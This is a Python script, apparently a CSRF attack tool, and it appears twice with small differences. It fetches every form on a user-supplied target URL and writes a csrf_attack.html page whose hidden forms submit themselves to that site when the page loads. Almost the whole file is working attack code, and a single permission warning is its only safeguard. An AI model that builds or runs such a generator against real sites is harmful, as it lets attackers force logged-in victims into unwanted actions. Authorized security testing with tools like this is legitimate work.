'''import requests
from bs4 import BeautifulSoup
import logging
import os

logging.basicConfig(level=logging.INFO)

def find_forms(url):
    """Find all forms on a given URL and return form details."""
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')
        forms = soup.find_all('form')
        form_details = []
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = {}
            for input_tag in form.find_all('input'):
                name = input_tag.get('name')
                value = input_tag.get('value', '')
                if name:
                    inputs[name] = value
            form_details.append({
                'action': action,
                'method': method,
                'inputs': inputs,
                'form_html': str(form)
            })
        return form_details
    except Exception as e:
        logging.error(f"Error fetching forms: {e}")
        return []

def extract_csrf_token(form_html):
    """Extract CSRF token from the form HTML."""
    soup = BeautifulSoup(form_html, 'html.parser')
    token = None
    token_field = soup.find('input', {'name': 'csrf_token'})
    if token_field:
        token = token_field.get('value')
    return token

def generate_auto_submit_html(target_url, form_details):
    """Generate an HTML file that auto-submits the forms."""
    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>CSRF Attack Simulation</title>
    </head>
    <body>
    """

    for i, form in enumerate(form_details):
        action = form['action']
        if not action.startswith('http'):
            action = requests.compat.urljoin(target_url, action)
        method = form['method'].upper()
        inputs = ''.join([f'<input type="hidden" name="{name}" value="{value}">' for name, value in form['inputs'].items()])
        form_html = f"""
        <form id="form{i}" action="{action}" method="{method}">
            {inputs}
        </form>
        <script>
            document.getElementById('form{i}').submit();
        </script>
        """
        html_content += form_html

    html_content += """
    </body>
    </html>
    """

    # Save the HTML content to a file
    with open('csrf_attack.html', 'w') as file:
        file.write(html_content)
    logging.info("Generated csrf_attack.html with auto-submitting forms.")

if __name__ == "__main__":
    logging.info("CSRF Attack Simulation Script")
    logging.warning("WARNING: Only use this script on sites where you have explicit permission.")

    # Input target URL
    target_url = input("Enter the target URL: ").strip()

    # Find forms on the target URL
    form_details = find_forms(target_url)
    if not form_details:
        logging.info("No forms found on the target URL.")
    else:
        logging.info(f"Found {len(form_details)} form(s) on the target URL.")

        # Generate the HTML file with auto-submitting forms
        generate_auto_submit_html(target_url, form_details)'''
import requests
from bs4 import BeautifulSoup
import logging
import os

logging.basicConfig(level=logging.INFO)

def find_forms(url):
    """Find all forms on a given URL and return form details."""
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')
        forms = soup.find_all('form')
        form_details = []
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = {}
            for input_tag in form.find_all('input'):
                name = input_tag.get('name')
                value = input_tag.get('value', '')
                if name:
                    inputs[name] = value
            form_details.append({
                'action': action,
                'method': method,
                'inputs': inputs,
                'form_html': str(form)
            })
        return form_details
    except Exception as e:
        logging.error(f"Error fetching forms: {e}")
        return []

def extract_csrf_token(form_html):
    """Extract CSRF token from the form HTML."""
    soup = BeautifulSoup(form_html, 'html.parser')
    token = None
    token_field = soup.find('input', {'name': 'csrf_token'})
    if token_field:
        token = token_field.get('value')
    return token

def generate_auto_submit_html(target_url, form_details):
    """Generate an HTML file that auto-submits the forms."""
    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>CSRF Attack Simulation</title>
    </head>
    <body>
    <h1>CSRF Attack Simulation</h1>
    """

    for i, form in enumerate(form_details):
        action = form['action']
        if not action.startswith('http'):
            action = requests.compat.urljoin(target_url, action)
        method = form['method'].upper()
        inputs = ''.join([f'<input type="hidden" name="{name}" value="{value}">' for name, value in form['inputs'].items()])
        form_html = f"""
        <div>
            <h2>Form {i+1}</h2>
            <p><strong>Action:</strong> {action}</p>
            <p><strong>Method:</strong> {method}</p>
            <p><strong>Inputs:</strong></p>
            <ul>
                {''.join([f'<li>{name}: {value}</li>' for name, value in form['inputs'].items()])}
            </ul>
        </div>
        <form id="form{i}" action="{action}" method="{method}">
            {inputs}
        </form>
        <script>
            document.getElementById('form{i}').submit();
        </script>
        """
        html_content += form_html

    html_content += """
    </body>
    </html>
    """

    # Save the HTML content to a file
    with open('csrf_attack.html', 'w') as file:
        file.write(html_content)
    logging.info("Generated csrf_attack.html with auto-submitting forms.")

if __name__ == "__main__":
    logging.info("CSRF Attack Simulation Script")
    logging.warning("WARNING: Only use this script on sites where you have explicit permission.")

    # Input target URL
    target_url = input("Enter the target URL: ").strip()

    # Find forms on the target URL
    form_details = find_forms(target_url)
    if not form_details:
        logging.info("No forms found on the target URL.")
    else:
        logging.info(f"Found {len(form_details)} form(s) on the target URL.")

        # Generate the HTML file with auto-submitting forms
        generate_auto_submit_html(target_url, form_details)

